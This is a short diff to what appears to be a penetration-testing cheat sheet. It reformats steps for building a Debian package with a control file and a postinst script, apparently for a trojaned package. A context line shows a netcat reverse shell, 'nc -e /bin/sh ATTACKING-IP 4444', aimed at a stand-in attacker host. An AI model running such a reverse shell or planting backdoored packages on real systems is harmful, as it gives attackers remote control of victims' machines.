@@ -393,7 +393,8 @@ nc -e /bin/sh ATTACKING-IP 4444
 	- "dpkg -x [debfile] work"
 	- "mkdir work/DEBIAN"
  	- "cd DEBIAN"
-	- "vim control"
+
+- "vim control" (control file for the package)
 ~~~
 
 Package: [Package Name]
@@ -407,8 +408,7 @@ Description: Network utility for hacking all the things.
 ~~~
 	
 
-- "vim postinst"
-
+- "vim postinst" (postinst file for the package)
 ~~~
 
 #!/bin/sh
